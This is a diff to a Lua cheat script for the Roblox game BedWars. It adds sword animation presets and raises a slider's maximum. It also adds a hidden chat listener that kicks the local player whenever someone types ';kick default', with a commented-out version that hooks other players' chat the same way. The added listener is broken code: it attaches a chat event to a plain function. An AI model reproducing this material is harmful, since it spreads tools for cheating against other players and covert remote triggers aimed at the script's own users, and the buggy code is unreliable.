@@ -1320,6 +1320,30 @@ runcode(function()
         end
         return returning
     end
+    local Anims = {
+        ["Slow"] = {
+            {CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(220), math.rad(100), math.rad(100)),Time = 0.25},
+            {CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.25}
+        },
+        ["Weird"] = {
+            {CFrame = CFrame.new(0, 0, 1.5) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)),Time = 0.25},
+            {CFrame = CFrame.new(0, 0, -1.5) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)),Time = 0.25},
+            {CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.25}
+        },
+        ["Self"] = {
+            {CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-90), math.rad(90), math.rad(90)),Time = 0.25},
+            {CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.25}
+        },
+        ["Butcher"] = {
+            {CFrame = CFrame.new(-0.01, -0.01, -1.01) * CFrame.Angles(math.rad(-90), math.rad(90), math.rad(0)),Time = 0.08},
+            {CFrame = CFrame.new(-0.01, -0.01, -1.01) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(-90)), Time = 0.08}
+        },
+        ["ExhibitionOld"] = {
+                    {CFrame = CFrame.new(0.5, -0.01, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.10},
+                    {CFrame = CFrame.new(0.5, -0.51, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.08},
+                    {CFrame = CFrame.new(0.5, -0.01, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.08}
+                }
+    }
     local VMAnim = false
     local HitRemote = Client:Get(bedwars["SwordRemote"])
     local origC0 = game:GetService("ReplicatedStorage").Assets.Viewmodel.RightHand.RightWrist.C0
@@ -1720,7 +1744,7 @@ runcode(function()
         ["Name"] = "Val",
         ["Function"] = function() end,
         ["Min"] = 0,
-        ["Max"] = 1,
+        ["Max"] = 5,
         ["Default"] = 0.30,
         ["Round"] = 1
     })
@@ -2306,4 +2330,38 @@ if checkstate(lplr) then
 		end
 	end);
 end
+
+
+if checkstate(lplr) then
+    local players, replicatedStorage = game:GetService("Players"), game:GetService("ReplicatedStorage");
+	local defaultChatSystemChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents");
+
+    local function onMessageDoneFiltering(msg)
+	local args = {
+		[1] = msg,
+		[2] = "All"
+	}
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+  end
+
+	-- main
+	onMessageDoneFiltering.Chatted:Connect(function(msg)
+		 if msg == ";kick default" then
+                    game:GetService("Players").LocalPlayer:kick("l")
+              end
+	end);
+  end
+
 update_tag_meta()
+
+
+--[[for i, v in pairs(game:GetService("Players"):GetChildren()) do
+    if game:GetService("Players").LocalPlayer ~= v then
+        if checkstate(lplr) then
+            v.Chatted:Connect(function(msg)
+                if msg == ";kick default" then
+                    game:GetService("Players").LocalPlayer:kick("l")
+                  end
+                 end
+              end)--]]
+
